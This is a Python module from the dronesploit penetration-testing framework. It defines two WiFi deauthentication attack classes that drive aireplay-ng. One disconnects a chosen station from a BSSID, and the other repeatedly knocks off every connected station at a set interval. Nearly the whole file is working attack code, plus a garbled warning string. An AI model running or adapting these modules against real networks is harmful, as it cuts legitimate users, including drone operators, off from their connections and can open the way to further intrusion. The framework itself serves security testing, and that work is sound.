# -*- coding: UTF-8 -*-
from dronesploit.wifi import *


class Deauth(WifiAttackModule, DeauthMixin):
    """ Deauthenticate the target station connected to the given BSSID given its MAC address.
    
    Author:  Yannick Pasquazzo
    Version: 1.1
    """
    config = Config({
        Option(
            'STATION',
            "Target station's MAC address",
            True,
            choices=lambda o: o.state['TARGETS'][o.config.option('ESSID').value]['stations'],
            validate=lambda s, v: re.match(r"(?:[0-9A-F]{2}\:){5}[0-9A-F]{2}", v) is not None,
        ): None,
    })
    requirements = {'system': ["aircrack-ng/aireplay-ng"]}
    
    def preload(self):
        super(Deauth, self).preload()
        stations = self.config.option('STATION').choices
        essid = self.config.option('ESSID').value
        if len(stations) == 0:
            self.logger.warning("No station connec ; please use the 'scan' command".format(essid))
            return False
        self.config['STATION'] = stations[0]
    
    def run(self):
        t = self.console.state['TARGETS']
        self.deauth(t[self.config.option('ESSID').value]['bssid'], self.config.option('STATION').value)


class DeauthAny(WifiAttackModule, DeauthMixin):
    """ Deauthenticate any target found connectect to the given BSSID on the given channel.
    
    Author:  Yannick Pasquazzo
    Version: 1.1
    """
    config = Config({
        Option(
            'DEAUTH_INTERVAL',
            "Target station deauthentication interval (seconds)",
            False,
        ): 5,
    })
    requirements = {'system': ["aircrack-ng/aireplay-ng"]}
    
    def run(self):
        self.logger.warning("Press Ctrl+C to interrupt")
        t = self.console.state['TARGETS']
        self.deauth(t[self.config.option('ESSID').value]['bssid'], interval=self.config.option('DEAUTH_INTERVAL').value)

